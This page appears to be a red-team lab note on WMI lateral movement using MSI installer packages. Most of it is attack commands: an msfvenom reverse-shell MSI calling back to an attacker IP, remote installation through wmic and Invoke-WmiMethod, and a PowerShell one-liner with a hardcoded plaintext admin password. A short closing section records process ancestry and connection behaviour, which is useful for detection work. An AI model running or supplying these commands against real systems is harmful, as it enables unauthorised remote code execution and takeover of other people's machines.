---
description: WMI lateral movement with .msi packages
---

# WMI + MSI Lateral Movement

## Execution

Generating malicious payload in MSI \(Microsoft Installer Package\):

{% code title="attacker@local" %}
```csharp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil64.msi
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2018-10-19-17-31-00.png)

I tried executing the .msi payload like so, but got a return code `1619` and a quick search on google returned nothing useful:

{% code title="attacker@remote" %}
```csharp
wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLocation='\\10.0.0.2\c$\experiments\evil64.msi'
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2018-10-19-18-45-55.png)

I had to revert to a filthy way of achieving the goal:

{% code title="attacker@remote" %}
```csharp
net use \\10.0.0.7\c$ /user:administrator@offense; copy C:\experiments\evil64.msi \\10.0.0.7\c$\PerfLogs\setup.msi ; wmic /node:10.0.0.7 /user:administrator@offense product call install PackageLocation=c:\PerfLogs\setup.msi
```
{% endcode %}

![](../../.gitbook/assets/peek-2018-10-19-18-41.gif)

Additionally, the same could of be achieved using powershell cmdlets:

{% code title="attacker@remote" %}
```csharp
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential (Get-Credential)
```
{% endcode %}

Get a prompt for credentials:

![](../../.gitbook/assets/screenshot-from-2018-10-19-19-02-10.png)

and enjoy the code execution:

![](../../.gitbook/assets/screenshot-from-2018-10-19-19-02-48.png)

Or if no GUI is available for credentials, a oneliner:

{% code title="attacker@remote" %}
```csharp
$username = 'Administrator';$password = '123456';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName pc-w10 -Credential $credential
```
{% endcode %}

![](../../.gitbook/assets/screenshot-from-2018-10-19-19-09-42.png)

## Observations

Note the process ancestry: `services > msiexec.exe > .tmp > cmd.exe`:

![](../../.gitbook/assets/screenshot-from-2018-10-19-18-46-37.png)

and that the connection is initiated by the .tmp file \(I ran another test, hence another file name\):

![](../../.gitbook/assets/screenshot-from-2018-10-19-18-55-53.png)

## References

{% embed url="https://www.cybereason.com/blog/wmi-lateral-movement-win32" %}

{% embed url="https://twitter.com/buffaloverflow/status/1002523407261536256" %}

